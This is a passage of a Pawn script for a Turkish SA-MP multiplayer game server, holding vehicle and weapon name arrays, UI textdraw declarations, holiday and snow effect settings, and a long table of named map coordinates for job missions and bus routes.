	"Windsor", "Monster", "Monster", "Uranus", "Jester", "Sultan", "Stratium",
	"Elegy", "Raindance", "RCTiger", "Flash", "Tahoma", "Savanna", "Bandito",
    "FreightFlat", "StreakCarriage", "Kart", "Mower", "Dune", "Sweeper",
	"Broadway", "Tornado", "AT-400", "DFT-30", "Huntley", "Stafford", "BF-400",
	"News Van", "Tug", "Trailer", "Emperor", "Wayfarer", "Euros", "Hotdog", "Club",
	"FreightBox", "Trailer", "Andromada", "Dodo", "RCCam", "Launch", "LSPD",
 	"SFPD", "LVPD", "PoliceRanger", "Picador", "S.W.A.T", "Alpha",
 	"Phoenix", "Glendale", "Sadler", "Luggage", "Luggage", "Stairs", "Boxville",
 	"Tiller", "UtilityTrailer"
};

new aWeaponNames[][32] = {
	{"Unarmed (Fist)"}, // 0
	{"Brass Knuckles"}, // 1
	{"GolfClub"}, // 2
	{"NightStick"}, // 3
	{"Knife"}, // 4
	{"Baseball Bat"}, // 5
	{"Shovel"}, // 6
	{"PoolCue"}, // 7
	{"Katana"}, // 8
	{"Chainsaw"}, // 9
	{"PurpleDildo"}, // 10
	{"BigWhiteVibrator"}, // 11
	{"MediumWhiteVibrator"}, // 12
	{"SmallWhiteVibrator"}, // 13
	{"Flowers"}, // 14
	{"Cane"}, // 15
	{"Grenade"}, // 16
	{"Teargas"}, // 17
	{"Molotov"}, // 18
	{" "}, // 19
	{" "}, // 20
	{" "}, // 21
	{"9mm Pistol"}, // 22
	{"9mm Pistol (Silenced)"}, // 23
	{"DesertEagle"}, // 24
	{"Normal Shotgun"}, // 25
	{"Sawnoff Shotgun"}, // 26
	{"Combat Shotgun"}, // 27
	{"Micro Uzi (Mac 10)"}, // 28
	{"MP5"}, // 29
	{"AK47"}, // 30
	{"M4"}, // 31
	{"Tec9"}, // 32
	{"Country Rifle"}, // 33
	{"Sniper Rifle"}, // 34
	{"Rocket Launcher"}, // 35
	{"Heat-Seeking Rocket Launcher"}, // 36
	{"Flamethrower"}, // 37
	{"Minigun"}, // 38
	{"Satchel Charge"}, // 39
	{"Detonator"}, // 40
	{"Spray Can"}, // 41
	{"Fire Extinguisher"}, // 42
	{"Camera"}, // 43
	{"Night Vision Goggles"}, // 44
	{"Infrared Vision Goggles"}, // 45
	{"Parachute"}, // 46
	{"Fake Pistol"} // 47
};
// ************************************************************************************************************************************************************
// sedo malikane
// *******************************************
/*#define SEDO_KAPI_PASS "$$S3D0B4B4$$"
#define DialogOynakDisKapi 4700

new SedoDisKapi[2];
new SedoGarajKapi[4];
new SedoIcKapi[2];
new OynakDisKapi[MAX_PLAYERS];
*/
// ************************************************************************************************************************************************************
// V4 Oyuncu Arayüzü [ EvoturK ]
// ************************************************************************************************************************************************************
/*new Text:UI_AltBox;
new Text:UI_AltInfo;
new Text:UI_AltLogo[2];
new Text:UI_UstBox;
new Text:UI_SaatTarih;

new Text:UI_OLogo;
new PlayerText:UI_ONick[MAX_PLAYERS];
new PlayerText:UI_OBilgi[MAX_PLAYERS];

new Text:UI_MLogo;

new Text:UI_GLogo;
new PlayerText:UI_GYuk[MAX_PLAYERS];
new PlayerText:UI_GYer[MAX_PLAYERS];

new PlayerText:UI_Konvoy[MAX_PLAYERS];

new Text:UI_FLogo[3];

new Text:UI_Login[7];
*/

// ************************************************************************************************************************************************************
// V5 Oyuncu Arayüzü [ EvoturK ]
// ************************************************************************************************************************************************************
new Text:UI_AltBar,
	PlayerText:UI_AltBilgi[MAX_PLAYERS],
	Text:UI_GMBilgi,
	Text:UI_SCBilgi,
	Text:UI_SLogo,

	Text:UI_ORBilgiL,
	PlayerText:UI_ORBilgiH[MAX_PLAYERS],
	Text:UI_OGBilgiL,
	PlayerText:UI_OGBilgiH[MAX_PLAYERS],
	PlayerText:UI_OGBilgi[MAX_PLAYERS],
	Text:UI_OKBilgiL,
	PlayerText:UI_OKBilgiH[MAX_PLAYERS],
	PlayerText:UI_OKBilgi[MAX_PLAYERS],
	Text:UI_RMBilgiL,
	Text:UI_RMBilgiH,
    Text:UI_RMBilgi,

	Text:UI_TarihSaat;

new PlayerText:UI_WantedL[MAX_PLAYERS],
	PlayerText:UI_Wanted[MAX_PLAYERS];

// Yýlbaþý Textdrawlarý
new Text:Textdraw17;
new Text:Textdraw18;
new Text:Textdraw19;
new Text:Textdraw20;
new Text:Textdraw21;
new Text:Textdraw22;
new Text:Textdraw23;
new Text:Textdraw24;
new Text:Textdraw25;
new Text:Textdraw26;
new Text:Textdraw27;
new Text:Textdraw28;
new Text:Textdraw29;
new Text:Textdraw30;
new Text:Textdraw31;
new Text:Textdraw32;
new Text:Textdraw33;
new Text:Textdraw34;
new Text:Textdraw35;
new Text:Textdraw36;
new Text:Textdraw37;
new Text:Textdraw38;
new Text:Textdraw39;
new Text:Textdraw40;
new Text:Textdraw41;
new Text:Textdraw42;
new Text:Textdraw43;
new Text:Textdraw44;

// 23 Nisan Textdrawlarý
new Text:Textdraw45;
new Text:Textdraw46;
new Text:Textdraw47;

// Kurban Bayramý Textdrawlarý
new Text:Textdraw48;




/////firework
#define RocketHeight 70 // You can edit this
#define RocketSpread 30 // Spread till
#define MAX_LAUNCH 5 // Max Could be launched
#define MAX_FIREWORKS 100 // Max Fireworks had
#define COLOR_YELLOW 0xFFFF00AA // Credits =  SA-MP Forums

new Rocket[MAX_LAUNCH];
new RocketLight[MAX_LAUNCH];
new RocketSmoke[MAX_LAUNCH];
new RocketExplosions[MAX_LAUNCH];
new Float:nx[MAX_LAUNCH];
new Float:ny[MAX_LAUNCH];
new Float:nz[MAX_LAUNCH];
new FireworkTotal;
new Fired;

// ************************************************************************************************************************************************************
// Yýlbaþý Sayacý ( By Hwang )
// ************************************************************************************************************************************************************
new
	Text: Yilbasi8,
	Text: Yilbasi9,
	Text: Yilbasi10,
	Text: Yilbasi11,
	Text: Yilbasi12,
	Text: Yilbasi13,
	Text: Yilbasi14,
	Text: Yilbasi15,
	Text: Yilbasi16,
	Text: Yilbasi19,
	YilbasiTimer,
	bool: Colorize_ = true,
	timeVar[3]
;

#define YBSCORE_PRIZE														  (100) //Yeni yýla girildiðinde 1000 skor verir
#define YBMONEY_PRIZE 													(1000000) //Yeni yýla girildiðinde $500,000 verir
#define YBSERVER_NAME								   "Canakkale Meslek Sunucusu" //Server adýnýzý yazýn

#define GECE_GUNDUZ

// ************************************************************************************************************************************************************
// Kar Sistemi ( By ForumSA:MPliDayý )
// ************************************************************************************************************************************************************
#define MAX_SLOTS           80

#define MAX_SNOW_OBJECTS    8
#define UPDATE_INTERVAL     750

#define ploop(%0)			for(new %0 = 0; %0 < MAX_SLOTS; %0++) if(IsPlayerConnected(%0))
#define CB:%0(%1)           forward %0(%1); public %0(%1)

new bool:snowOn[MAX_SLOTS char],
	snowObject[MAX_SLOTS][MAX_SNOW_OBJECTS],
	updateTimer[MAX_SLOTS char]
;

// ************************************************************************************************************************************************************
// PPC_DefLocations
// ************************************************************************************************************************************************************

// Setup a custom type that holds all data about a location on the map (used for missions)
enum TLocation
{
	LocationName[100], // The name of the location
	Float:LocX, // The X-position of the location
	Float:LocY, // The Y-position of the location
	Float:LocZ // The Z-position of the location
}

// Setup an array that holds all location-data (except taxi and busdriver classes, these have their own locations)
new ALocations[][TLocation] =
{
	// LocationName, LocationX, LocationY, LocationZ
	{"Belirlenmedi", 0.0, 0.0, 0.0}, // Location 0 = dummy location (never used)

	{"LS Construction Site", 1859.0, -1314.0, 14.0}, // Location 1
	{"SF Construction Site", -2083.0, 209.0, 35.5}, // Location 2
	{"LV Construction Site", 2708.0, 878.0, 10.0}, // Location 3
	{"Avery Construction", 312.25, -233.75, 1.6}, // Location 4
	{"Clown's Pocket Constr.", 2467.0, 1923.0, 9.8}, // Location 5
	{"Solarin Industries", -1822.5, 41.25, 15.25}, // Location 6
	{"Blueberry Truck Terminal", 52.75, -278.0, 1.7}, // Location 7
	{"KACC Military Fuels", 2707.6848, 2649.5352, 10.8203}, // Location 8
	{"SA Federal Mint", -2441.0, 521.5, 30.0}, // Location 9
	{"Angel Pine Sawmill", -1965.75, -2436.0, 30.7}, // Location 10
	{"Quarry", 587.25, 844.75, -42.5}, // Location 11
	{"Quarry Top", 370.0, 874.0, 20.5}, // Location 12
	{"Easter Bay Lumberyard", -763.5, -136.0, 65.7}, // Location 13
	{"LS Papermill", 2331.5, -2071.5, 13.6}, // Location 14
	{"Sprunk Factory", 1334.75, 287.0, 19.6}, // Location 15
	{"SF Medical Center", -2607.0, 684.0, 27.9}, // Location 16
	{"Angel Pine Junkyard", -1873.0, -1685.0, 21.8}, // Location 17
	{"LV Freight Depot", 599.5, 1224.75, 11.8}, // Location 18
	{"LS Garbage Compound", 2181.0, -1980.5, 13.6}, // Location 19
	{"LV Industrial Estate", 1635.75, 750.5, 11.0}, // Location 20
	{"EasterBoard Farm", -69.5, -35.75, 3.2}, // Location 21
	{"SF Hill Farm", -1423.5, -1469.0, 101.7}, // Location 22
	{"Pecker's Feed & Seed", -310.5, 2669.5, 62.7}, // Location 23
	{"San Fierro Port", -1691.0, 31.5, 3.6}, // Location 24
	{"LV Refinery", 271.1506, 1466.7963, 10.5859}, // Location 25
	{"LS Refinery", 2484.0, -2085.0, 13.6}, // Location 26
	{"Countryside Gas Station", -86.0, -1192.75, 2.0}, // Location 27
	{"SF Xoomer Gas Station", -1659.0, 444.0, 7.2}, // Location 28
	{"SF Gas Station", -2421.5, 953.25, 45.3}, // Location 29
	{"LS Going Station", 1926.0, -1791.5, 13.5}, // Location 30
	{"Xoomer Gas Station", -1488.75, 1875.25, 32.7}, // Location 31
	{"Whetstone Gas Station", -1629.0, -2700.0, 48.6}, // Location 32
	{"Desert Gas Station", -1309.5, 2703.75, 50.1}, // Location 33
	{"Dilimore Gas Station", 664.5, -583.75, 16.4}, // Location 34
	{"Abandoned Airport Fuel", 387.9, 2590.25, 16.5}, // Location 35
	{"San Fierro International", -1152.25, -146.5, 14.2}, // Location 36
	{"Easter Bay Chemical", -1033.75, -625.25, 32.1}, // Location 37
	{"LS Ocean Docks", 2466.0, -2219.25, 13.6}, // Location 38
	{"Bioengineering Corp.", 1347.5, 349.5, 20.0}, // Location 39
	{"Greenglass College", 999.0, 1086.75, 11.0}, // Location 40
	{"Fleischberg Brewery", -149.75, -220.25, 1.5}, // Location 41
	{"Bayside Boatyard", -2430.75, 2310.5, 5.0}, // Location 42
	{"LV Butcher", 977.5, 2096.75, 11.0}, // Location 43
	{"SF Catering LTD", -1945.75, -1073.5, 31.0}, // Location 44
	{"LS Donut shop", 1025.75, -1355.0, 13.8}, // Location 45
	{"Porter's House", 2439.75, 114.5, 26.5}, // Location 46
	{"Chuckup LTD", 1470.5, 1017.5, 10.9}, // Location 47
	{"LS Warehouse", 2178.5, -2279.75, 13.6}, // Location 48
	{"SF Supa Save", -2463.5, 782.0, 35.2}, // Location 49
	{"Verona Mall", 1044.75, -1548.75, 13.6}, // Location 50
	{"Las Venturas Mall", 2867.25, 2586.0, 10.7}, // Location 51
	{"Vank Hoff Hotel", -2490.75, 337.5, 33.4}, // Location 52
	{"Emerald Mall", 2056.75, 2251.25, 10.7}, // Location 53
	{"LS Ocean Docks", 2574.25, -2223.75, 13.4}, // Location 54
	{"Bayside Warehouse", -2285.0, 2281.5, 5.0}, // Location 55
	{"Fleischberg Brewery", -18.5, -282.0, 5.5}, // Location 56
	{"Las Venturas Stadium", 1377.5, 2245.75, 10.9}, // Location 57
	{"P. Creek General Store", 2318.0, -92.5, 26.5}, // Location 58
	{"LV Dirtring Stadium", 1112.0, 1451.75, 5.9}, // Location 59
	{"The Pleasure Domes", -2697.0, 1402.5, 7.2}, // Location 60
	{"4 Dragons Casino", 1903.75, 960.5, 10.9}, // Location 61
	{"SF Financial Center", -2039.5, 467.5, 35.2}, // Location 62
	{"Area 69", 134.54, 1945.79, 19.00}, // Location 63

	{"LV Industrial Estate", 1673.2363, 729.9935, 10.8203}, // Location 64
	{"LV Parcel", 2261.2107, 2763.9829, 10.8203}, // Location 65
	{"DHL LV", 1703.4761, 990.4976, 10.8203}, // Location 66
	{"Blueberry Acress", -28.9159, 101.0574, 3.1172}, // Location 67
	{"LV Farm", 904.7554, 2477.2766, 10.8203}, // Location 68
	{"SF Food", -1945.4891, -1082.0676, 30.7734}, // Location 69
	{"Palamino Creek Store", 2310.4128, -74.5431, 26.4844}, // Location 70
	{"Dillimore Warehouse", 797.6771, -611.0841, 16.3432}, // Location 71
	{"LV Planing Depo", 2418.1995, 1103.4550, 10.8203}, // Location 72
	{"Pier 69", -1741.9951, 1424.0016, 7.1875}, // Location 73
	{"Whestone Farm", -1424.7069, -1517.4451, 101.7323}, // Location 74
	{"Fleishberg Beer", -22.0005, -286.3022, 5.4297}, // Location 75
	{"San Fierro Furniture", -2092.6169, 95.1842, 35.3203}, // Location 76
	{"Ford Carson", -159.0666, 1161.8231, 19.7422}, // Location 77
	{"El Quebrados Depot", -1526.4578, 2636.3728, 55.8359}, // Location 78
	{"LS Hospital", 1147.2289, -1315.6012, 13.6701}, // Location 79
	{"Shoddy LTD", 1676.0140, 1789.2946, 10.8203}, // Location 80
	{"Veardant Port", 365.4657, 2537.2712, 16.6642}, // Location 81
	{"SF Hospital", -2673.4785, 629.2484, 14.4531}, // Location 82
	{"SF Cia Depo", -2440.8533, 522.3694, 29.9143}, // Location 83
	{"SF Battarya Point", -2645.5261, 1370.3979, 7.1661}, // Location 84
	{"Flint Country Benzinlik", -69.0634, -1161.5724, 1.7500}, // Location 85
	{"Tierra Robada Benzinlik", -1313.3171, 2707.8005, 50.0625}, // Location 86
	{"Yeni Sanayi", -151.2598,-1714.2722,2.8688}, // Location 87

	{"SF Airport Gate 1", -1337.94, -222.79,   14.14}, // ID = 88
	{"SF Airport Gate 2", -1395.26, -104.20,   14.14}, // ID = 89
	{"SF Airport Cargo Bay 1", -1337.16, -542.29,   14.14}, // ID = 90
	{"SF Airport Cargo Bay 2", -1412.96, -579.85,   14.14}, // ID = 91

	{"LS Airport Gate 1", 1747.04, -2441.04,   13.55}, // ID = 92
	{"LS Airport Gate 2", 1902.16, -2350.11,   13.54}, // ID = 93
	{"LS Airport Cargo Bay 1", 1889.10, -2625.49,   13.54}, // ID = 94
	{"LS Airport Cargo Bay 2", 1754.74, -2622.69,   13.54}, // ID = 95
	{"LS Airport Cargo Bay 3", 1617.61, -2622.30,   13.54}, // ID = 96

	{"LV Airport Gate 1", 1564.77, 1536.77,   10.82}, // ID = 97
	{"LV Airport Gate 2", 1569.85, 1358.58,   10.86}, // ID = 98
	{"LV Airport Cargo Bay 1", 1307.41, 1324.01,   10.82}, // ID = 99
	{"LV Airport Cargo Bay 2", 1308.47, 1361.32,   10.82}, // ID = 100

	{"Verdant Meadows Gate", 392.13, 2531.27, 16.54}, // ID = 101
	{"Verdant Meadows Cargo Bay", 291.08, 2525.75, 16.79}, // ID = 102

	{"Kastamonu International Airport", -5371.8130,1046.2107,46.7214}, // Loc 103

	{"TestRock", 351.5, 1008.75, 28.4}, // ID = 104
	{"TestCP", 344.75, 1020.5, 28.3}, // ID = 105


	// YENI TUGIS
	{"Wasp Weapons(YeniTugis)", 3708.8347,-2596.4673,10.3062}, // ID 106
	{"Gameroglu Warehouse(YeniTugis)", 3835.8044,-2439.6123,11.1766}, // ID 107
	{"Sins Agaoglu Constructions(YeniTugis)", 3611.9612,-1999.8308,11.2112}, // ID 108
	{"Mardin Agaogullari Ahirport(YeniTugis)", 4715.7676,-102.5239,11.0000}, // ID 109
	{"Dr. Evo Hospital(YeniTugis)", 4537.7153,777.6892,11.1687}, // ID 110
	{"Adminoglu Tesisleri(YeniTugis)", 4365.9272,608.0930,11.2587}, // ID 111
	//

	// MADISON
	{"Papercuts(Feri'yle)", 4119.8008,-2301.5378,12.7000}, // ID 112
	{"Silver Warehouse(Feri'yle)", 2704.7993,-3054.6052,47.2998}, // ID 113
	{"Madison Car Parts(Feri'yle)", 2741.9644,-3363.7092,47.3887}, // ID 114
	{"Mardison Petrolleri(Feri'yle)", 3978.0320,-4394.2993,12.6687}, // ID 115
	{"Madison Constructions(Feri'yle)", 3899.4827,-4412.4067,12.7306}, // ID 116
	//

	//MUROLAND
    {"Muroland Warehouse", 139.7127, 5705.2505, 14.0552}, // ID 117
	{"Muroland Refinery", -448.1949, 6403.9380, 23.2766}, // Location 118
	//

	//ISTANBUL
	{"Izmir City", 1443.2581, -2996.3669, 2.5056}, // Location 119
	{"Mavi Sehir Chemicals", 924.1135, -3801.1001, 9.4579}, // Location 120
	{"Mavi Sehir Warehouse", 815.9246, -3820.9976, 9.8169}, // Location 121
	{"Istanbul City Refinery", 82.0818, -3671.8003, 13.8000}, // Location 122
	{"Istanbul City Warehouse", 252.8615, -3628.7861, 13.8000}, // Location 123
	{"Harbour Island Warehouse", 3536.34, 5124.68, 9.39}, // Location 124
	{"Harbour Chemicals", 4374.04, 5110.53, 9.70}, // Location 125
	//

	// DIVER
	{"Diver Chemicals", 5112.5977, 2568.4260, 7.1818}, // Location 126
	{"Diver Island Farm", 6118.5308, 3077.8230, 13.9688}, // Location 127
	{"Diver Constructions", 6701.0181, 2098.2222, 12.9688}, // Location 128
	//

	// LONGWAY
	{"Longway Constructions", -2884.44, -6142.11, 4.24}, // Location 129
	{"Longway Warehouse", -4931.15, -5082.38, 16.22}, // Location 130
	{"Longway Refinery", -6563.91, -8486.61, 27.09}, // Location 131
	{"Longway Docks", -5453.46, -8817.51, 6.42}, // Location 132
	//

	// KASTAMONU
	{"Kastamonu International Airport", -5439.8237,806.7692,45.8000}, // 133
	{"Kastamonu RS Haul", -4710.4805,837.3731,48.4773}, // 134
	{"Kastamonu Yeni Sanayi", -5097.8027,1675.6464,45.5344}, // Loc 135
	{"Kastamonu Munko Sunta AS", -4404.5410,2472.5356,26.7344}, // Loc 136
	{"Kastamonu Lider Kargo", -5164.5029,853.9618,45.5891}, // Loc 137 Boþaltma
	{"Kastamonu Lider Kargo", -5230.1411,871.7438,45.2266}, // Loc 138 Yükleme
	{"Kastamonu Yeni Yol Tesisleri", -3487.3679,2213.5981,29.1344}, // Loc 139
	{"Yeni Sanayi", -151.2598,-1714.2722,2.8688}, // Location 140
	//

	//ANADOLU
	{"Kizilkaya Maden Ocagi(Anadolu)", -3250.0913,-2854.1545,109.4829}, // Location 141
	{"Kizilkaya Warehouse(Anadolu)", -3050.5400,-2796.4995,150.9970}, // Location 142
	{"Anadolu Petrolleri(Anadolu)", -4307.0127,-1960.2845,10.9035}, // Location 143
	{"Anadolu Constructions(Anadolu)", -4205.1157,-2013.9667,10.8985}, // Location 144
	//
	{"Blueberry Tugay Airport", -341.0244,-431.7714,7.1875}, //Location 145
	{"Bayside Airport",-2335.6174,1816.7899,6.8100}, //Location 146

	//cöpcü
	{"Cop Deposu", -1853.88, -1649.88, 25.27}, // ID = 147
	{"SF Insaat Copluk", -2110.3691, 296.0221, 35.0271}, // ID = 148
	{"Las Venturas Copluk", 1447.31, 2327.89, 10.82}, // ID = 149
	{"Grove Street", 2504.7415, -1659.8160, 13.4073}, // ID = 150
	{"Tekerlekci", 2184.7354, -1988.1028, 13.5500}, // ID = 151
	{"LV Koy Coplugu", 2439.0369, 113.5607, 26.4770}, // ID = 152
	{"LV AVM Copluk", 2785.0269, 2416.8042, 10.8203}, // ID = 153
	{"Bayside Copluk", -2401.1973, 2350.9153, 4.9897}, // ID = 154
	//


	//banka
	{"Los Santos Bankasi", 1482.9587, -1743.5732, 13.5469}, // ID = 155
	{"Maze Bank", -1933.0275, 722.4465, 45.4453}, // ID = 156
	{"Devlet Bankasi", -2757.2292, 374.6443, 4.3375}, // ID = 157
	{"SF Sirketi",-2061.1536, -95.5488, 35.1641}, // ID = 158
	{"Las Venturas Bankasi", 1010.6124, 1107.7637, 10.8203}, // ID = 159
	{"Admin Lojistik", 1902.2988, 2754.0176, 10.8203}, // ID = 160
	{"The Visage Oteli", 2031.9620, 1920.9404, 12.3306}, // ID = 161
	{"4 Dragon Kumarhane", 2032.0265, 1008.7308, 10.8203}, // ID = 162
	{"Crystal Bank LS", 1212.2804, -1830.4103, 13.4056}, // ID = 163
	{"Banka Deposu", -2440.3132, 512.8794, 29.9127}, // ID = 164
	//

	//emkatu
	{"Emkatu Petrolleri",-1212.78, 4781.41,  109.00,}, // ID = 165
	{"Emkatu Sanayi", -1270.49, 3536.11,  100.77}, // ID = 166
	//

	//itfaiyeci
	{"Ls Ev",2079.0891,-1171.7212,23.8358}, // ID = 167
	{"Itfaiye Ussu", 1100.2979,-1197.1613,17.9863}, // ID = 168
	{"Ls Hastane",2031.9377,-1408.5579,17.1641}, // ID = 169
	{"Depo LS", 2369.6438,-2286.6226,13.3921}, // ID = 170
	{"Ls Airport",1633.2726,-2325.3623,13.5469}, // ID = 171
	{"Lv Kumarhane", 2156.1167,2164.8625,10.6719}, // ID = 172
	{"Alis Veris Merkezi LV",2853.9104,2413.3569,10.8203}, // ID = 173
	{"Arena LV", 1092.9421,1608.8302,12.5469}, // ID = 174
	{"Sf Insaat",-2058.2886,291.8183,35.5672}, // ID = 175
	{"SF EV", -2721.7039,974.8476,54.4679}, // ID = 176
	{"EV SF",-2801.7107,-132.9697,7.1875}, // ID = 177

	//tugayogullari
	{"Tugayogullari Petrol", -2256.9285,3362.6450,138.3000}, // ID = 178
	{"Tugayogullari Insaat",-3326.3030,2641.4695,138.3000}, // ID = 179
	//

	//KONYA
	{"Konya Askeri Havalimani", 3839.5662,-2749.1855,22.3141}, // ID = 180
	{"Konya Havalimani", 4056.2871,-3270.9888,78.4875}, // ID = 181
	{"Konya Organize Sanayii 1", 2534.0977,-4117.8613,25.6738}, // ID = 182
	{"Konya Organize Sanayii 2", 3572.3435,-3954.7551,57.5344}, // ID = 183
	{"Konya Sekiz Insaat", 3319.5088,-4429.7075,16.7016}, // ID = 184
	{"Konya Petrolleri", 3814.3894,-3819.6836,8.8041}, // ID = 185
	{"Konya Askeri Sevkiyat Bolgesi", 3895.1042,-2725.9016,22.1141}, // ID = 186
	//

	//ANTALYA MAP YÜK YERLERÝ
	{"Antalya Mazi Dagi Fabrikasi", -1983.4015,-4125.8569,258.8363}, // ID 187
	{"Antalya Geri Donusum Fabrikasi", 230.0506,-4078.2935,43.2938}, // ID 188
	{"Antalya Liman", 468.2993,-5431.6250,4.4172}, // ID 189
	{"Antalya BBR Enerji", -190.3326,-3761.2390,50.4210}, // ID 190
	{"Antalya-Alanya Et Ciftligi", -897.4758,-3204.1565,48.5912}, // ID 191
	{"Antalya BBR Petrolleri",826.2961,-3411.5996,11.9563},  // ID 192
	//

	// ANKARA MAP YÜK YERLERÝ
	{"Ankara Warehouse", -4322.89, -2837.53,   26.00}, // ID = 193

	// DÜZCE MAP YÜK YERLERÝ
	{"Duzce AVM", -3772.82, -218.89,   47.47}, // ID = 194

	// LV OTOGAR KARÞISI
	{"Lucifer Esya Deposu", 1279.94, 1008.93,   10.40}, // ID = 195
	
	// [ Dolmuþ ] ==============================================================
	{"LV Dolmus Merkez", 2877.93, 1881.69,   10.81}, // ID = 196
	{"101-1", 2851.04, 2206.09,   10.66}, // ID = 197
	{"101-2", 2890.27, 2447.16,   10.81}, // ID = 198
	{"101-3", 2633.89, 2343.33,   10.66}, // ID = 199
	{"101-4", 2597.45, 2236.84,   10.66}, // ID = 200
	{"101-5", 2499.62, 2152.84,   10.66}, // ID = 201
	{"101-6", 2316.89, 2236.81,   10.68}, // ID = 202
	{"101-7", 2319.29, 2449.72,   10.81}, // ID = 203
	{"101-8", 2115.73, 2456.78,   10.66}, // ID = 204
	{"101-8-yeniden", 2083.64, 2456.76,   10.66}, // ID = 205
	{"101-9", 1987.60, 2647.74,   10.66}, // ID = 206
	{"101-10", 1993.19, 2738.96,   10.66}, // ID = 207
	{"101-11", 2083.26, 2664.00,   10.64}, // ID = 208
	{"101-12", 1968.38, 2521.98,    6.87}, // ID = 209
	{"203-1", 2633.09, 1500.77,   10.66}, // ID = 210
	{"203-2", 2482.27,  863.85,    6.79}, // ID = 211
	{"203-3", 1779.65,  812.25,   10.89}, // ID = 212
	{"203-4", 1781.29,  248.76,   19.37}, // ID = 213
	{"203-5", 2340.08,  158.98,   26.32}, // ID = 214
	{"203-6", 2280.99,  -51.23,   27.01}, // ID = 215
	{"203-7", 2391.39,  -31.97,   26.32}, // ID = 216
	{"203-8", 2684.72, -319.88,   29.61}, // ID = 217
	{"203-9", 2641.90, -1043.65,   69.39}, // ID = 218
	{"203-10", 2415.82, -1252.74,   23.81}, // ID = 219
	{"203-11", 2230.96, -1129.62,   25.62}, // ID = 220
	{"203-12", 2067.90, -1036.73,   33.48}, // ID = 221
	{"203-13", 1713.53, -476.94,   33.42}, // ID = 222
	{"203-14", 2004.59,  826.21,    6.79}, // ID = 223
	{"208-1", 2734.33, 2134.47,    6.78}, // ID = 224
	{"208-2", 2053.43, 2583.62,    6.85}, // ID = 225
	{"208-3", 1287.95, 2480.92,    7.77}, // ID = 226
	{"208-4", 1014.95, 2563.23,   10.70}, // ID = 227
	{"208-5",  378.70, 2715.58,   60.72}, // ID = 228
	{"208-6", -224.99, 2704.64,   62.53}, // ID = 229
	{"208-7", -826.93, 2736.47,   45.58}, // ID = 230
	{"208-7-Yenile", -891.95, 2731.53,   45.85}, // ID = 231
	{"208-8", -1452.45, 2731.86,   65.13}, // ID = 232
	{"208-9", -2433.48, 3264.09,  138.43}, // ID = 233
	{"208-10", -3008.76, 2659.64,  138.43}, // ID = 234
	{"208-11", -2885.27, 1166.52,   12.01}, // ID = 235
	{"208-12", -2754.98,  778.42,   54.22}, // ID = 236
	{"208-13", -2611.27,  704.47,   27.80}, // ID = 237
	{"208-14", -2442.87,  743.05,   35.00}, // ID = 238
	{"208-15", -2256.27,  114.50,   35.16}, // ID = 239
	{"208-16", -2065.26,  -73.46,   35.16}, // ID = 240
	{"208-17", -1760.10,  -99.60,    4.25}, // ID = 241
	{"208-18", -1762.27,  330.78,    7.95}, // ID = 242
	{"208-19", -889.41,  823.85,   19.63}, // ID = 243
	{"208-20", 1356.03,  827.06,    6.89}, // ID = 244
	{"208-21", 2003.08,  826.24,    6.79}, // ID = 245
	{"310-1", 2586.84, 1476.16,   10.67}, // ID = 246
	{"310-2", 2497.37, 1535.69,   10.67}, // ID = 247
	{"310-3", 2408.05, 1617.01,   10.66}, // ID = 248
	{"310-4", 2191.05, 1537.00,   10.71}, // ID = 249
	{"310-5", 2160.88, 1678.94,   10.74}, // ID = 250
	{"310-6", 2218.38, 1838.45,   10.81}, // ID = 251
	{"310-7", 2155.74, 1958.72,   10.66}, // ID = 252
	{"310-8", 2119.23, 2073.43,   10.66}, // ID = 253
	{"310-9", 2036.87, 1909.15,   12.16}, // ID = 254
	{"310-10", 2039.65, 1572.47,   10.66}, // ID = 255
	{"310-11", 2038.90, 1342.56,   10.66}, // ID = 256
	{"310-12", 2038.63, 1131.22,   10.66}, // ID = 257
	{"310-13", 2038.69,  999.52,   10.66}, // ID = 258
	{"310-14", 2350.54, 1010.83,   10.66}, // ID = 259
	{"310-15", 2430.58, 1176.66,   10.66}, // ID = 260
	{"310-16", 2591.57, 1189.84,   10.66}, // ID = 261
	{"310-17", 2551.17, 1431.15,   10.66}, // ID = 262
	{"310-18", 2641.73, 1424.19,   10.19}, // ID = 263
	{"310-19", 2735.47, 1429.61,    6.81}, // ID = 264
	
	//==========================================================================
	
	// San Fierro Düzenlemede Eklenen Yük Yerleri
    {"PasPas Rafinery", -3106.66, -283.17,   10.04}, // ID = 265
	{"Fako Ogullari Silah Deposu", -3025.98, -300.69,    7.33}, // ID = 266
	
	// [ Dolmuþ ] ==============================================================
 	{"Hat 155-1", -2207.74,  559.95,   35.00}, // ID = 267
	{"Hat 155-2", -2017.95,  560.03,   35.01}, // ID = 268
	{"Hat 155-3", -2009.99,  292.94,   34.25}, // ID = 269
	{"Hat 155-4", -2018.69,  159.49,   28.14}, // ID = 270
	{"Hat 155-5", -2010.81,  -56.86,   35.15}, // ID = 271
	{"Hat 155-6", -2058.57, -288.09,   35.41}, // ID = 272
	{"Hat 155-7", -2239.23, -186.50,   35.16}, // ID = 273
	{"Hat 155-8", -2343.94, -172.54,   35.30}, // ID = 274
	{"Hat 155-9", -2397.98,  -66.62,   35.15}, // ID = 275
	{"Hat 155-10", -2417.57,   28.72,   35.01}, // ID = 276
	{"Hat 155-11", -2450.47,  141.78,   34.95}, // ID = 277
	{"Hat 155-12", -2395.85,  315.70,   35.07}, // ID = 278
	{"Hat 155-13", -2297.85,  401.96,   35.00}, // ID = 279
	{"Hat 155-14", -2223.26,  458.30,   35.00}, // ID = 280
	{"Hat 155-15", -2234.51,  571.82,   35.00}, // ID = 281
	{"384-1", -2249.14,  613.81,   43.51}, // ID = 282
	{"384-2", -2249.48,  713.66,   49.28}, // ID = 283
	{"384-3", -2346.01,  811.86,   40.61}, // ID = 284
	{"384-4", -2380.82,  906.34,   45.28}, // ID = 285
	{"384-5", -2324.26,  954.55,   55.57}, // ID = 286
	{"384-6", -2248.94, 1026.91,   83.67}, // ID = 287
	{"384-7", -2200.29, 1089.68,   79.84}, // ID = 288
	{"384-8", -2150.71,  983.82,   79.84}, // ID = 289
	{"384-9", -2150.48,  832.25,   69.39}, // ID = 290
	{"384-10", -2150.54,  639.59,   52.25}, // ID = 291
	{"384-11", -2232.90,  571.95,   35.00}, // ID = 292
	{"780-1", -2291.31,  572.31,   35.00}, // ID = 293
	{"780-2", -2463.24,  572.08,   20.22}, // ID = 294
	{"780-3", -2668.61,  629.07,   14.44}, // ID = 295
	{"780-4", -2737.24,  571.56,   14.39}, // ID = 296
	{"780-5", -2728.43,  510.39,    8.68}, // ID = 297
	{"780-6", -2724.03,  418.76,    4.13}, // ID = 298
